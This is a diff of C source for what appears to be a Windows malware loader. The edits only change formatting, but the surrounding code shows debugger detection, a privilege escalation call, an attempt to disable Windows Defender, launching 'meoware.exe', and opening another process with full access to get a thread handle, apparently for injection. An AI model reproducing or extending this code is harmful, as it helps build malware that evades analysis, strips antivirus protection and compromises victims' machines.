@@ -25,8 +25,8 @@ int main(int arcg,char* argv[]) {
 
 	if (IsDebuggerPresent()) {
 
-		printf("%s the program is debugged ",e);
-		return EXIT_FAILURE;
+	printf("%s the program is debugged ",e);
+	return EXIT_FAILURE;
 	}
 
 	LARGE_INTEGER StartingTime, EndingTime, ElapsedMicroseconds;
@@ -49,7 +49,10 @@ int main(int arcg,char* argv[]) {
 	priv_esc();
 	printf("%s trying to disable windows defender...\n",k);
 
-	if (!dis_windef()) { printf("%s faild disable windows defender :(\n",e); }
+	if (!dis_windef()) { 	
+	
+	printf("%s faild disable windows defender :(\n",e); 
+	}
 
 	printf("%s starting main meoware.exe...\n",i);
 
@@ -62,8 +65,10 @@ int main(int arcg,char* argv[]) {
 
 	hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,PID);
 	printf("%s got a handle to the process\n\\---0x%p\n",k,hProcess);
-
-	if (hProcess == NULL) { printf("%s couldnt get a handle to process (%ld), error : %ld", e, PID, GetLastError());
+	
+	if (hProcess == NULL) {
+	
+	printf("%s couldnt get a handle to process (%ld), error : %ld", e, PID, GetLastError());
 	return EXIT_FAILURE;
 	}
 
@@ -80,7 +85,6 @@ int main(int arcg,char* argv[]) {
 	
 		printf("%s faild to get a handle to the thread , error: %ld ", e,GetLastError());
 		CloseHandle(hProcess);
-		
 		return EXIT_FAILURE;
 	}
 
